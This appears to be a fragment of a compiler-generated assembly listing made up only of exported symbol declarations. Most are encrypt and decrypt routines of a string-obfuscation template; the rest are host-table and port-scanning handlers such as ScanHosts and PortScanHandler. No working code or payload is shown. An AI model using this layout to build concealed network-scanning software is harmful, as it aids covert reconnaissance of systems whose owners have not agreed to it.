PUBLIC	??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
PUBLIC	??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
PUBLIC	??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
PUBLIC	?HostHandler@@YAKPEAX@Z				; HostHandler
PUBLIC	??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
PUBLIC	?AddHost@@YAHK@Z				; AddHost
PUBLIC	?CreateHostTable@@YAHXZ				; CreateHostTable
PUBLIC	?ScanHosts@@YAXXZ				; ScanHosts
PUBLIC	?CompleteAsyncConnect@@YAH_K@Z			; CompleteAsyncConnect
PUBLIC	?TimerCallback@@YAXPEAXE@Z			; TimerCallback
PUBLIC	?PortScanHandler@@YAKPEAX@Z			; PortScanHandler
PUBLIC	??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
PUBLIC	??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
